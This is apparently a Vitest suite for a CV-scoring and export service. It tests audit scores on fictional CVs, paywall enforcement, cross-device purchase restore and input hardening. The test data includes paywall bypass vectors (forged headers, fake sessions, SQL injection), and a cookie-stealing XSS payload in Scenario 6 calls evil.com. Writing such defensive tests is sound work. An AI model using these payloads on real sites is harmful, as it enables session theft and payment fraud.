/**
 * Tier 4 Real-World Application Scenario Test Suite: Real-World CV Workloads
 *
 * Simulates high-fidelity production scenarios and adversarial workloads:
 * 1. Realistic Senior Tech Lead CV (6 roles, 18 bullets with metrics, >70% XYZ saturation, ATS hierarchy) -> score >=85, isSubmissionReady: true
 * 2. Realistic Junior Career Switcher CV (weak bullets lacking metrics, missing phone number) -> score <55, isSubmissionReady: false, actionable fixes
 * 3. Adversarial Paywall Bypass Simulation (10-vector attack script against all export routes) -> 100% blocked with HTTP 402
 * 4. Candidate Cross-Device Journey (phone checkout -> desktop restore -> single-column PDF export)
 * 5. Privacy & References Preservation ("Available upon request" vs 3 explicit referees vs placeholder flagging)
 * 6. Malformed / Hostile Input Hardening (XSS injection, 50,000-char stress, non-UTF8 binary strings) -> zero 500 crashes
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import path from 'path';

// Route handlers
import { GET as docxGet, POST as docxPost } from '@/app/api/export/docx/route';
import { GET as pdfGet, POST as pdfPost } from '@/app/api/export/pdf/route';
import { POST as emailPost } from '@/app/api/email/send-cv/route';
import { POST as scorePost } from '@/app/api/score/route';

// Domain engines
import { auditCvQuality } from '@/lib/cvQualityEngine';
import { paymentRegistry } from '@/lib/paymentRegistry';
import { verifyServerPayment } from '@/lib/serverPaymentVerification';
import { createDocxFromStandardCV } from '@/lib/docxGenerator';
import { createPdfFromStandardCV, generatePdfBuffer } from '@/lib/pdfGenerator';
import { StandardCVDocument } from '@/lib/cvStandardData';
import { Packer } from 'docx';

// Test harnesses
import {
  createTestRequest,
  createJsonRequest,
  createGetRequest,
  invokeRouteHandler,
} from '../helpers/routeHarness';

describe('Tier 4: Real-World Application Scenarios & Workloads', () => {
  const ORIGINAL_ENV = { ...process.env };
  const TEST_REGISTRY_PATH = path.resolve(
    process.cwd(),
    `data/test_payments_tier4_${Date.now()}_${Math.random().toString(36).slice(2)}.json`
  );

  beforeEach(async () => {
    process.env.PAYMENT_REGISTRY_PATH = TEST_REGISTRY_PATH;
    process.env.ENABLE_PAYMENT_TEST_BYPASS = 'false';
    await paymentRegistry.clear();
  });

  afterEach(async () => {
    await paymentRegistry.clear();
    process.env = { ...ORIGINAL_ENV };
  });

  // ==========================================================================
  // SCENARIO 1: REALISTIC SENIOR TECH LEAD CV
  // 6 roles, 18 bullet points with metrics (XYZ saturation >70%), complete contact details, ATS hierarchy
  // ==========================================================================
  describe('Scenario 1: Realistic Senior Tech Lead CV Submission & Audit', () => {
    const SENIOR_TECH_LEAD_CV: StandardCVDocument = {
      id: 'scenario1_senior_tech_lead',
      name: 'SARAH CHEN',
      title: 'Senior Technical Lead & Cloud Infrastructure Architect',
      contact: {
        email: 'sarah.chen@cloudsystems.io',
        phone: '+1 (555) 345-6789',
        location: 'Seattle, WA / San Francisco, CA / Remote',
        nationality: 'US Authorized',
        linkedin: 'https://linkedin.com/in/sarahchen-techlead',
      },
      summary:
        'Strategic Senior Technical Lead with 10+ years of engineering leadership architecting distributed microservices, multi-region cloud infrastructures, and high-throughput data platforms. Proven track record leading 24 engineers across 3 continents, driving 99.995% service availability, and reducing annual cloud infrastructure expenditure by $340,000 through automated Kubernetes cluster bin-packing. Expert in Golang, Rust, AWS, and enterprise Zero-Trust security.',
      skillsGrid: [
        {
          category: 'Architecture & Distributed Systems',
          skills: 'Kubernetes (EKS), Docker, Microservices, Event-Driven Architecture, Kafka, gRPC, REST APIs',
        },
        {
          category: 'Cloud Infrastructure & DevOps',
          skills: 'AWS (IAM, VPC, DynamoDB, RDS), Terraform, GitHub Actions, Prometheus, Grafana, Datadog',
        },
        {
          category: 'Languages & Storage',
          skills: 'Golang, TypeScript, Python, PostgreSQL, Redis, Apache Cassandra, Elasticsearch',
        },
        {
          category: 'Engineering Leadership & Compliance',
          skills: 'SOC2 Type II, ISO 27001, Team Mentorship (18+ devs), Agile Scrum, Technical Roadmap Governance',
        },
      ],
      experience: [
        {
          title: 'Principal Cloud Architect / Technical Lead',
          company: 'CloudSphere Global Systems',
          dates: '01/2023 - Present',
          bullets: [
            'Architected multi-region AWS cloud foundation supporting 4.5M active daily users, achieving 99.995% service availability and zero unscheduled downtime.',
            'Spearheaded migration of 14 monolithic services into containerized Kubernetes microservices, cutting API p99 latency from 450ms to 65ms.',
            'Negotiated enterprise AWS EDP commitment and instituted spot-instance autoscaling, reducing annual compute expenditure by $340,000.',
          ],
        },
        {
          title: 'Senior Technical Lead - Platform Engineering',
          company: 'Nexus Distributed Labs',
          dates: '06/2020 - 12/2022',
          bullets: [
            'Directed cross-functional engineering pod of 14 backend and DevOps developers, increasing quarterly feature release velocity by 45%.',
            'Engineered real-time telemetry pipeline consuming 120,000 events/second using Apache Kafka and Golang, enabling sub-minute incident response.',
            'Automated end-to-end CI/CD deployment gates using Terraform and GitHub Actions, eliminating 18 hours of manual deployment overhead weekly.',
          ],
        },
        {
          title: 'Staff Software Engineer',
          company: 'FinTech Scale Solutions',
          dates: '03/2018 - 05/2020',
          bullets: [
            'Designed PCI-DSS compliant payment reconciliation engine handling $18M in daily transactional throughput with 100% ledger accuracy.',
            'Optimized relational PostgreSQL query paths and connection pools, reducing database lock contention by 72% under peak holiday loads.',
            'Mentored 8 junior and mid-level engineers through technical design reviews and paired programming, accelerating promotion velocity by 50%.',
          ],
        },
        {
          title: 'Senior Backend Engineer',
          company: 'Apex Data Infrastructure',
          dates: '09/2016 - 02/2018',
          bullets: [
            'Built distributed key-value caching layer in Redis and Go, absorbing 85% of repeated read queries and protecting backend stores.',
            'Implemented automated chaos engineering tests using Chaos Mesh, uncovering 14 latent network partitions prior to customer impact.',
            'Collaborated with security teams to enforce mutual TLS (mTLS) across 150 internal service nodes with zero degradation in throughput.',
          ],
        },
        {
          title: 'Software Engineer II',
          company: 'Hyperion Web Platforms',
          dates: '08/2014 - 08/2016',
          bullets: [
            'Developed customer billing microservices in Node.js and TypeScript, reducing invoice calculation discrepancies by 94%.',
            'Refactored Elasticsearch indexing schemas for 40M product records, cutting search query latency by 38%.',
            'Standardized unit and integration test suites with 92% code coverage, decreasing post-release bug reports by 65%.',
          ],
        },
        {
          title: 'Systems & Software Engineer',
          company: 'Vanguard Analytics',
          dates: '06/2013 - 07/2014',
          bullets: [
            'Constructed automated ETL data ingestion scripts in Python, processing 25GB of nightly telemetry data for business intelligence.',
            'Automated server health monitoring across 80 Linux instances with Bash and Nagios, reducing alert detection time by 55%.',
            'Authored standard operating procedures for disaster recovery drills, achieving full data restoration within 2 hours.',
          ],
        },
      ],
      education: [
        {
          qualification: 'Master of Science in Computer Science',
          institution: 'University of Washington',
          year: '2013',
        },
        {
          qualification: 'Bachelor of Science in Computer Engineering',
          institution: 'Purdue University',
          year: '2011',
        },
      ],
      references: [
        {
          name: 'Dr. Aris Thorne',
          title: 'Chief Technology Officer',
          company: 'CloudSphere Global Systems',
          relationship: 'Direct Executive Supervisor',
          phone: '+1 (555) 890-1234',
          email: 'a.thorne@cloudsystems.io',
          location: 'Seattle, WA',
        },
        {
          name: 'Linda Martinez',
          title: 'VP of Engineering',
          company: 'Nexus Distributed Labs',
          relationship: 'Former Engineering Director',
          phone: '+1 (555) 901-2345',
          email: 'l.martinez@nexuslabs.com',
          location: 'San Francisco, CA',
        },
      ],
    };

    it('evaluates senior tech lead CV with score >= 85 and isSubmissionReady: true', () => {
      const audit = auditCvQuality(SENIOR_TECH_LEAD_CV);

      // Core Acceptance Criteria
      expect(audit.overallScore).toBeGreaterThanOrEqual(85);
      expect(audit.isSubmissionReady).toBe(true);

      // Contact Integrity
      expect(audit.contactIntegrity.isValid).toBe(true);
      expect(audit.contactIntegrity.hasFullName).toBe(true);
      expect(audit.contactIntegrity.hasPhoneNumber).toBe(true);
      expect(audit.contactIntegrity.hasProfessionalEmail).toBe(true);
      expect(audit.contactIntegrity.hasLocation).toBe(true);
      expect(audit.contactIntegrity.issues.length).toBe(0);

      // Section Architecture Hierarchy
      expect(audit.sectionArchitecture.isHierarchyCompliant).toBe(true);
      expect(audit.sectionArchitecture.hierarchyIssues.length).toBe(0);

      // Formatting Guardrails
      expect(audit.formattingGuardrails.isCompliant).toBe(true);
      expect(audit.formattingGuardrails.isSingleColumn).toBe(true);
      expect(audit.formattingGuardrails.hasMultiCellTables).toBe(false);
      expect(audit.formattingGuardrails.hasTextBoxes).toBe(false);

      // References Preservation
      expect(audit.referencesPreservation.isPreservedWithoutHallucination).toBe(true);
      expect(audit.referencesPreservation.referencesCount).toBe(2);

      // Zero critical issues
      expect(audit.criticalIssues.length).toBe(0);
    });

    it('verifies that exactly 18 bullet points across 6 roles achieve >70% XYZ metric saturation', () => {
      const allBullets = SENIOR_TECH_LEAD_CV.experience.flatMap((e) => e.bullets);
      expect(SENIOR_TECH_LEAD_CV.experience.length).toBe(6);
      expect(allBullets.length).toBe(18);

      const audit = auditCvQuality(SENIOR_TECH_LEAD_CV);
      expect(audit.lineByLineFeedback.length).toBe(18);
      expect(audit.metricSaturation).toBeGreaterThan(0.70);
      expect(audit.isMetricSaturationCompliant).toBe(true);

      // Check that the vast majority of bullets satisfy the XYZ formula
      const xyzCompliantBullets = audit.lineByLineFeedback.filter((b) => b.isXyzCompliant);
      expect(xyzCompliantBullets.length / allBullets.length).toBeGreaterThanOrEqual(0.70);
    });

    it('generates pristine single-column DOCX and PDF documents from the senior tech lead CV', async () => {
      // DOCX Generation
      const docxDoc = createDocxFromStandardCV(SENIOR_TECH_LEAD_CV);
      const docxBuf = await Packer.toBuffer(docxDoc);
      expect(docxBuf.length).toBeGreaterThan(2000);

      // PDF Generation
      const pdfBuf = generatePdfBuffer(SENIOR_TECH_LEAD_CV);
      expect(pdfBuf.toString('utf-8', 0, 5)).toBe('%PDF-');
      expect(pdfBuf.length).toBeGreaterThan(2000);

      const pdfText = pdfBuf.toString('latin1');
      expect(pdfText).toContain('SARAH CHEN');
      expect(pdfText).toContain('CloudSphere Global Systems');
      expect(pdfText).toContain('Nexus Distributed Labs');
      expect(pdfText).toContain('Aris Thorne');
    });
  });

  // ==========================================================================
  // SCENARIO 2: REALISTIC JUNIOR CAREER SWITCHER CV
  // Weak bullets lacking metrics (e.g. "Responsible for bug fixes"), missing phone number -> score <55, isSubmissionReady: false
  // ==========================================================================
  describe('Scenario 2: Realistic Junior Career Switcher CV Audit', () => {
    const JUNIOR_CAREER_SWITCHER_CV: StandardCVDocument = {
      id: 'scenario2_junior_switcher',
      name: 'MARCUS WEBB',
      title: 'Junior Web Developer',
      contact: {
        email: 'marcus.webb@freemail.com',
        phone: '', // MISSING PHONE NUMBER
        location: 'Austin, TX',
      },
      summary:
        'Enthusiastic bootcamp graduate and career switcher seeking an entry-level junior web developer role. Quick learner eager to contribute to software projects.',
      skillsGrid: [
        {
          category: 'Frontend & Tools',
          skills: 'HTML, CSS, JavaScript, React basics, Git, VS Code',
        },
      ],
      experience: [
        {
          title: 'Junior Web Development Intern',
          company: 'Hill Country Digital',
          dates: '2023 - 2024',
          bullets: [
            'Responsible for bug fixes and testing software modules.',
            'Assisted senior developers with code reviews and documentation.',
            'Helped maintain the internal team wiki and customer support tickets.',
            'Worked on updating website styles and color schemes.',
          ],
        },
        {
          title: 'Customer Service Representative',
          company: 'Retail Alliance',
          dates: '2021 - 2023',
          bullets: [
            'Handled customer inquiries over the phone and via email.',
            'Responsible for tracking order shipments and processing product returns.',
            'Collaborated with store managers on weekly shift schedules.',
          ],
        },
      ],
      education: [
        {
          qualification: 'Certificate in Full Stack Web Development',
          institution: 'Austin Coding Academy',
          year: '2023',
        },
        {
          qualification: 'B.A. in Communications',
          institution: 'Texas State University',
          year: '2020',
        },
      ],
    };

    it('flags junior CV with score < 55, isSubmissionReady: false, and metric saturation < 30%', () => {
      const audit = auditCvQuality(JUNIOR_CAREER_SWITCHER_CV);

      // Score and Readiness
      expect(audit.overallScore).toBeLessThan(55);
      expect(audit.isSubmissionReady).toBe(false);

      // Metric Saturation
      expect(audit.metricSaturation).toBeLessThan(0.30);
      expect(audit.isMetricSaturationCompliant).toBe(false);

      // Contact Integrity: Missing phone
      expect(audit.contactIntegrity.hasPhoneNumber).toBe(false);
      expect(audit.contactIntegrity.isValid).toBe(false);
      const phoneIssue = audit.contactIntegrity.issues.find((i) => /phone/i.test(i));
      expect(phoneIssue).toBeDefined();

      // Actionable Fixes must be provided
      expect(audit.actionableFixes.length).toBeGreaterThan(0);
      expect(audit.criticalIssues.length).toBeGreaterThan(0);
    });

    it('identifies exact failing lines with line-by-line feedback and actionable revision suggestions', () => {
      const audit = auditCvQuality(JUNIOR_CAREER_SWITCHER_CV);
      const allBullets = JUNIOR_CAREER_SWITCHER_CV.experience.flatMap((e) => e.bullets);

      expect(audit.lineByLineFeedback.length).toBe(allBullets.length);

      // Check first bullet: "Responsible for bug fixes and testing software modules."
      const firstBullet = audit.lineByLineFeedback[0];
      expect(firstBullet.rawText).toBe(allBullets[0]);
      expect(firstBullet.isXyzCompliant).toBe(false);
      expect(firstBullet.hasQuantifiableMetric).toBe(false);
      expect(firstBullet.feedback).toMatch(/passive duty|lacks strong action verb|lacks quantifiable metric/i);
      expect(firstBullet.suggestedRevision).toBeDefined();
      expect(firstBullet.suggestedRevision).toContain('Spearheaded');

      // Check that 100% of bullets lack quantifiable metrics
      const quantifiedBullets = audit.lineByLineFeedback.filter((b) => b.hasQuantifiableMetric);
      expect(quantifiedBullets.length).toBe(0);
    });
  });

  // ==========================================================================
  // SCENARIO 3: ADVERSARIAL PAYWALL BYPASS SIMULATION
  // Multi-vector attack script attempting 10 distinct bypass patterns -> 100% blocked with HTTP 402
  // ==========================================================================
  describe('Scenario 3: Adversarial Paywall Bypass Simulation (10 Attack Vectors)', () => {
    // 10 distinct attack vectors
    const BYPASS_ATTACK_VECTORS: Array<{
      vectorId: string;
      description: string;
      searchParams?: Record<string, string>;
      headers?: Record<string, string>;
      bodyPayload?: Record<string, any>;
    }> = [
      {
        vectorId: 'V1_FORGED_LOCALSTORAGE_TOKEN',
        description: 'Forged client localStorage key (ratemycv_paid = true) passed as header',
        headers: { 'ratemycv_paid': 'true', 'x-paid-token': 'true' },
      },
      {
        vectorId: 'V2_FAKE_TEST_TOKEN',
        description: 'Hardcoded test mode token without server verification',
        searchParams: { session_id: 'cs_fake_bypass_token_000' },
        bodyPayload: { sessionId: 'cs_fake_bypass_token_000' },
      },
      {
        vectorId: 'V3_DEMO_BYPASS_TOKEN',
        description: 'Demo token prefix attempt (demo_free_export)',
        searchParams: { session_id: 'demo_free_export_token' },
        bodyPayload: { sessionId: 'demo_free_export_token' },
      },
      {
        vectorId: 'V4_MODIFIED_URL_PARAMS',
        description: 'Tampered URL parameters mimicking Stripe success redirect (?payment=success&paid=true)',
        searchParams: { payment: 'success', paid: 'true', unlock: 'all' },
      },
      {
        vectorId: 'V5_SPOOFED_ADMIN_HEADERS',
        description: 'Spoofed internal admin role headers (x-admin-override: true)',
        headers: {
          'x-admin-override': 'true',
          'x-internal-role': 'superuser',
          'x-bypass-paywall': '1',
        },
      },
      {
        vectorId: 'V6_WHITESPACE_SESSION_STRING',
        description: 'Empty whitespace string session ID to bypass null check',
        searchParams: { session_id: '   ' },
        bodyPayload: { sessionId: '   ' },
      },
      {
        vectorId: 'V7_FORGED_HEX_SESSION',
        description: 'Synthesized random hex string mimicking live Stripe session',
        searchParams: { session_id: 'cs_live_999999999999999999999999' },
        bodyPayload: { sessionId: 'cs_live_999999999999999999999999' },
      },
      {
        vectorId: 'V8_SQL_INJECTION_SESSION',
        description: "SQL injection tautology in session ID (cs_' OR '1'='1)",
        searchParams: { session_id: "cs_' OR '1'='1" },
        bodyPayload: { sessionId: "cs_' OR '1'='1" },
      },
      {
        vectorId: 'V9_XSS_PAYLOAD_SESSION',
        description: 'XSS script injection inside session parameter',
        searchParams: { session_id: '<script>alert(1)</script>' },
        bodyPayload: { sessionId: '<script>alert(1)</script>' },
      },
      {
        vectorId: 'V10_UNPAID_PENDING_SESSION',
        description: 'Unpaid pending session token from incomplete checkout',
        searchParams: { session_id: 'cs_test_pending_session_222' },
        bodyPayload: { sessionId: 'cs_test_pending_session_222' },
      },
    ];

    it('strictly blocks 100% of the 10 attack vectors on GET /api/export/docx with HTTP 402', async () => {
      for (const attack of BYPASS_ATTACK_VECTORS) {
        const req = createGetRequest('/api/export/docx', {
          searchParams: attack.searchParams,
          headers: attack.headers,
        });
        const res = await invokeRouteHandler(docxGet, req);
        expect(
          res.status,
          `Vector ${attack.vectorId} (${attack.description}) must return 402 on docx GET`
        ).toBe(402);
      }
    });

    it('strictly blocks 100% of the 10 attack vectors on POST /api/export/docx with HTTP 402', async () => {
      for (const attack of BYPASS_ATTACK_VECTORS) {
        const req = createJsonRequest(
          '/api/export/docx',
          {
            cvData: SENIOR_TECH_LEAD_CV,
            ...(attack.bodyPayload || {}),
          },
          {
            searchParams: attack.searchParams,
            headers: attack.headers,
          }
        );
        const res = await invokeRouteHandler(docxPost, req);
        expect(
          res.status,
          `Vector ${attack.vectorId} (${attack.description}) must return 402 on docx POST`
        ).toBe(402);
      }
    });

    it('strictly blocks 100% of the 10 attack vectors on GET /api/export/pdf with HTTP 402', async () => {
      for (const attack of BYPASS_ATTACK_VECTORS) {
        const req = createGetRequest('/api/export/pdf', {
          searchParams: attack.searchParams,
          headers: attack.headers,
        });
        const res = await invokeRouteHandler(pdfGet, req);
        expect(
          res.status,
          `Vector ${attack.vectorId} (${attack.description}) must return 402 on pdf GET`
        ).toBe(402);
      }
    });

    it('strictly blocks 100% of the 10 attack vectors on POST /api/export/pdf with HTTP 402', async () => {
      for (const attack of BYPASS_ATTACK_VECTORS) {
        const req = createJsonRequest(
          '/api/export/pdf',
          {
            cvData: SENIOR_TECH_LEAD_CV,
            ...(attack.bodyPayload || {}),
          },
          {
            searchParams: attack.searchParams,
            headers: attack.headers,
          }
        );
        const res = await invokeRouteHandler(pdfPost, req);
        expect(
          res.status,
          `Vector ${attack.vectorId} (${attack.description}) must return 402 on pdf POST`
        ).toBe(402);
      }
    });

    it('strictly blocks 100% of the 10 attack vectors on POST /api/email/send-cv with HTTP 402', async () => {
      for (const attack of BYPASS_ATTACK_VECTORS) {
        const req = createJsonRequest(
          '/api/email/send-cv',
          {
            email: 'attacker@evil.com',
            cvData: SENIOR_TECH_LEAD_CV,
            ...(attack.bodyPayload || {}),
          },
          {
            searchParams: attack.searchParams,
            headers: attack.headers,
          }
        );
        const res = await invokeRouteHandler(emailPost, req);
        expect(
          res.status,
          `Vector ${attack.vectorId} (${attack.description}) must return 402 on email POST`
        ).toBe(402);
      }
    });
  });

  // ==========================================================================
  // SCENARIO 4: CANDIDATE CROSS-DEVICE JOURNEY
  // Mobile checkout -> Completed purchase -> Desktop switch -> Email lookup -> Verified PDF download
  // ==========================================================================
  describe('Scenario 4: Candidate Cross-Device Journey', () => {
    const CANDIDATE_EMAIL = 'journey.alex@enterprise-cloud.com';
    const MOBILE_SESSION_ID = `cs_mobile_safari_${Date.now()}`;

    it('completes multi-device journey: mobile purchase restores on desktop via email lookup and enables single-column PDF export', async () => {
      // Step 1: Candidate on iPhone Safari initiates checkout and completes payment
      await paymentRegistry.recordPayment({
        sessionId: MOBILE_SESSION_ID,
        customerEmail: CANDIDATE_EMAIL,
        profileId: 'it_cloud',
        candidateName: 'Alex Morgan',
        paymentStatus: 'paid',
        amountCents: 900,
        currency: 'usd',
        invoiceNumber: 'INV-MOBILE-JOURNEY-001',
        createdAt: new Date(Date.now() - 1800000).toISOString(),
        updatedAt: new Date(Date.now() - 1800000).toISOString(),
        metadata: { clientDevice: 'Mobile Safari iOS 17.5' },
      });

      // Step 2: Candidate switches to Desktop Chrome (zero cookies, zero session tokens)
      // Candidate inputs email into Restore Access modal
      const isVerified = await paymentRegistry.isEmailVerified(CANDIDATE_EMAIL);
      expect(isVerified).toBe(true);

      const payments = await paymentRegistry.getPaymentsByEmail(CANDIDATE_EMAIL);
      expect(payments.length).toBe(1);
      expect(payments[0].sessionId).toBe(MOBILE_SESSION_ID);
      expect(payments[0].paymentStatus).toBe('paid');

      // Step 3: Desktop browser requests PDF download using restored email
      const desktopPdfReq = createGetRequest('/api/export/pdf', {
        searchParams: { email: CANDIDATE_EMAIL },
      });
      const pdfRes = await invokeRouteHandler(pdfGet, desktopPdfReq);

      expect(pdfRes.status).toBe(200);
      expect(pdfRes.getHeader('Content-Type')).toBe('application/pdf');
      expect(pdfRes.getHeader('X-Payment-Verified')).toBe('true');

      const pdfBuffer = await pdfRes.buffer();
      expect(pdfBuffer.toString('utf-8', 0, 5)).toBe('%PDF-');

      // Step 4: Verify that downloaded PDF is text-selectable and ATS compliant
      const pdfText = pdfBuffer.toString('latin1');
      expect(pdfText).toContain('ALEX MORGAN');
    });
  });

  // ==========================================================================
  // SCENARIO 5: PRIVACY & REFERENCES PRESERVATION
  // "Available upon request" recognized without false hallucination; 3 explicit referees preserved accurately
  // ==========================================================================
  describe('Scenario 5: Privacy & References Preservation', () => {
    it('accurately verifies candidate with privacy declaration "Available upon request" without penalty or hallucinated names', () => {
      const PRIVACY_CV: StandardCVDocument = {
        ...SENIOR_TECH_LEAD_CV,
        id: 'scenario5_privacy_cv',
        references: [],
        additionalInfo: {
          references: 'Professional references available upon request.',
        },
      };

      const audit = auditCvQuality(PRIVACY_CV);
      expect(audit.referencesPreservation.hasReferences).toBe(true);
      expect(audit.referencesPreservation.isPreservedWithoutHallucination).toBe(true);
      expect(audit.referencesPreservation.issues.length).toBe(0);
      expect(audit.isSubmissionReady).toBe(true);
    });

    it('accurately preserves all 3 explicit referees with contact details in document generation', async () => {
      const EXPLICIT_REFS_CV: StandardCVDocument = {
        ...SENIOR_TECH_LEAD_CV,
        id: 'scenario5_explicit_refs',
        references: [
          {
            name: 'Dr. Aris Thorne',
            title: 'Chief Technology Officer',
            company: 'CloudSphere Systems',
            relationship: 'Direct Manager',
            phone: '+1 (555) 123-4567',
            email: 'a.thorne@cloudsystems.io',
          },
          {
            name: 'Linda Martinez',
            title: 'VP of Engineering',
            company: 'Nexus Distributed Labs',
            relationship: 'Former Director',
            phone: '+1 (555) 234-5678',
            email: 'l.martinez@nexuslabs.com',
          },
          {
            name: 'Robert Sterling',
            title: 'Director of Infrastructure',
            company: 'FinTech Scale Solutions',
            relationship: 'Department Head',
            phone: '+1 (555) 345-6789',
            email: 'r.sterling@fintechscale.org',
          },
        ],
      };

      const audit = auditCvQuality(EXPLICIT_REFS_CV);
      expect(audit.referencesPreservation.hasReferences).toBe(true);
      expect(audit.referencesPreservation.referencesCount).toBe(3);
      expect(audit.referencesPreservation.isPreservedWithoutHallucination).toBe(true);
      expect(audit.referencesPreservation.issues.length).toBe(0);

      // Verify all 3 referees appear in generated PDF document
      const pdfBuf = generatePdfBuffer(EXPLICIT_REFS_CV);
      const pdfText = pdfBuf.toString('latin1');
      expect(pdfText).toContain('Aris Thorne');
      expect(pdfText).toContain('Linda Martinez');
      expect(pdfText).toContain('Robert Sterling');
    });

    it('detects and flags candidate references with dummy placeholder names or invalid contact details', () => {
      const PLACEHOLDER_REFS_CV: StandardCVDocument = {
        ...SENIOR_TECH_LEAD_CV,
        id: 'scenario5_placeholder_refs',
        references: [
          {
            name: 'John Doe', // Generic placeholder
            title: 'Manager',
            company: 'Sample Company',
            relationship: 'Supervisor',
            phone: '',
            email: '',
          },
        ],
      };

      const audit = auditCvQuality(PLACEHOLDER_REFS_CV);
      expect(audit.referencesPreservation.isPreservedWithoutHallucination).toBe(false);
      expect(audit.referencesPreservation.issues.length).toBeGreaterThan(0);
      const issue = audit.referencesPreservation.issues.find((i) => /placeholder/i.test(i));
      expect(issue).toBeDefined();
    });
  });

  // ==========================================================================
  // SCENARIO 6: MALFORMED / HOSTILE INPUT HARDENING
  // Injected XSS tags, 50,000-character experience text, non-UTF8 binary strings -> zero unhandled 500 exceptions
  // ==========================================================================
  describe('Scenario 6: Malformed & Hostile Input Hardening', () => {
    it('safely handles injected XSS payloads in CV text without unhandled exceptions or execution leaks', async () => {
      const xssCvText = `
<script>alert("PWNED_XSS")</script>
<img src=x onerror=fetch("https://evil.com/steal?token="+document.cookie)>
ALEX MORGAN
alex.morgan@executivemail.com | +1 (555) 234-5678 | New York, NY

PROFESSIONAL SUMMARY
<svg onload=alert(1)> Senior IT Support Lead directing distributed operations. Spearheaded service desk operations for 350+ users, achieving 98.4% SLA resolution.

CORE SKILLS
- Systems: Windows 11, Azure, Okta

PROFESSIONAL EXPERIENCE
Senior IT Support Specialist | NexaCloud | 2022 - Present
- Spearheaded Tier-1 service desk operations for 350+ users, achieving 98.4% first-contact SLA resolution.
- Automated zero-touch device provisioning for 400+ endpoints, reducing laptop deployment time by 68%.

EDUCATION
- B.S. in Information Technology | Global Institute of Technology | 2020

REFERENCES
- References available upon request.
      `.trim();

      // 1. Quality Audit on XSS text
      expect(() => auditCvQuality(xssCvText)).not.toThrow();
      const audit = auditCvQuality(xssCvText);
      expect(audit).toBeDefined();
      expect(typeof audit.overallScore).toBe('number');
      expect(audit.overallScore).toBeGreaterThan(0);

      // 2. Score API POST with XSS payload
      const scoreReq = createJsonRequest('/api/score', { cvText: xssCvText });
      const scoreRes = await invokeRouteHandler(scorePost, scoreReq);
      expect([200, 400]).toContain(scoreRes.status);
      expect(scoreRes.status).not.toBe(500);
    });

    it('processes massive 50,000-character experience text without stack overflow or memory exhaustion', () => {
      // Construct 50,000 character CV
      const repeatedBullet =
        'Spearheaded enterprise infrastructure modernization across 500+ microservices, reducing latencies by 35% and saving $50,000 annually.\n';
      const massiveExperience = repeatedBullet.repeat(350); // ~50,000 chars

      const massiveCvText = `
ALEX MORGAN
alex.morgan@executivemail.com | +1 (555) 234-5678 | New York, NY

PROFESSIONAL SUMMARY
Senior IT Support & Cloud Operations Lead with extensive experience in enterprise scale infrastructure.

CORE SKILLS
AWS, Kubernetes, Terraform, Python, Docker

PROFESSIONAL EXPERIENCE
Senior Technical Lead | Enterprise Global | 2020 - Present
${massiveExperience}

EDUCATION
B.S. in Computer Science | State University | 2020

REFERENCES
References available upon request.
      `.trim();

      expect(massiveCvText.length).toBeGreaterThanOrEqual(45000);

      // Audit must execute without timeout or memory crash
      const startTime = Date.now();
      const audit = auditCvQuality(massiveCvText);
      const duration = Date.now() - startTime;

      expect(audit).toBeDefined();
      expect(typeof audit.overallScore).toBe('number');
      expect(duration).toBeLessThan(5000); // Complete within 5 seconds
    });

    it('handles non-UTF8 binary strings, null bytes, and control characters gracefully with zero unhandled 500 crashes', async () => {
      const hostileBinaryString =
        'ALEX MORGAN\x00\x01\x02\x03\xFF\xFE\x00\x08alex.morgan@test.com | +1 (555) 234-5678\x00\x00\x7F';

      const hostileDoc: StandardCVDocument = {
        id: 'hostile_binary_cv',
        name: hostileBinaryString,
        title: 'Security Analyst \x00\xFF',
        contact: {
          email: 'alex.morgan@test.com',
          phone: '+1 (555) 234-5678',
          location: 'New York, NY \x00',
        },
        summary: 'Security analyst with \x00 binary handling experience.',
        skillsGrid: [{ category: 'Security', skills: 'SIEM, Firewalls \x00' }],
        experience: [
          {
            title: 'Analyst',
            company: 'CyberCorp \xFF',
            dates: '2022 - Present',
            bullets: [
              'Conducted 50+ vulnerability assessments, resolving 95% of high-severity CVEs.',
            ],
          },
        ],
        education: [{ qualification: 'B.S. in Cybersecurity', year: '2022' }],
      };

      // Quality Engine audit
      expect(() => auditCvQuality(hostileDoc)).not.toThrow();
      const audit = auditCvQuality(hostileDoc);
      expect(audit).toBeDefined();
      expect(typeof audit.overallScore).toBe('number');

      // PDF Generator
      expect(() => generatePdfBuffer(hostileDoc)).not.toThrow();
      const pdfBuf = generatePdfBuffer(hostileDoc);
      expect(pdfBuf.toString('utf-8', 0, 5)).toBe('%PDF-');

      // DOCX Generator
      expect(() => createDocxFromStandardCV(hostileDoc)).not.toThrow();
      const docxDoc = createDocxFromStandardCV(hostileDoc);
      const docxBuf = await Packer.toBuffer(docxDoc);
      expect(docxBuf.length).toBeGreaterThan(1000);
    });
  });
});
